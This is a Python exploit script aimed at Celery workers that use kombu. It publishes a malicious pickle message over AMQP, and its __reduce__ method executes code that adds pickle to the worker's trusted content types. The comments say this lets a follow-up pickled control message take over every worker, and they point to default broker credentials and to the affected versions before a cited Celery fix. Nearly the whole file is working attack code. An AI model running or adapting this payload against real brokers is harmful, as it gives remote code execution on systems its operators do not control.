from kombu import Connection, Producer
import time
from concurrent.futures import ThreadPoolExecutor

class RCE:
    def __reduce__(self):
        # overwrite kombu.serialization.loads() default param `_trusted_content` so that pickle becomes whitelisted
        # https://github.com/celery/kombu/blob/e9be6c85fedbca8a29383b91700832566bca2e46/kombu/serialization.py#L224
        # once this is ran on all hosts, you can then send a single pickled control message to pwn all workers
        # only matters for celery workers before this PR: https://github.com/celery/celery/pull/6757
        cmd = ("""
loads.__func__.__defaults__=loads.__func__.__defaults__[:-1] + (list(loads.__func__.__defaults__[-1])+['application/x-python-serialize'],)
""")
        return exec, (cmd,)

amqp_url = 'amqp://test:test@127.0.0.1:5672//' # default AMQP creds: guest:guest
queue_name = 'celery' # queue name, CELERY_DEFAULT_QUEUE in celery's app.conf, default is 'celery'
data = RCE()

def publish_message():
    with Connection(amqp_url) as connection:
        producer = Producer(connection)
        producer.publish(
            data,
            routing_key=queue_name,
            serializer='pickle',
            headers={'clock': 1, 'expires': time.time() + 200}
        )

if __name__ == "__main__":
    # number of workers to attack
    # NOTE: that a single worker MIGHT consume 2 evil tasks before the other worker get a chance to.
    num_threads = 1
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(publish_message) for _ in range(num_threads)]
        for future in futures:
            future.result()
    print("All messages published successfully.")
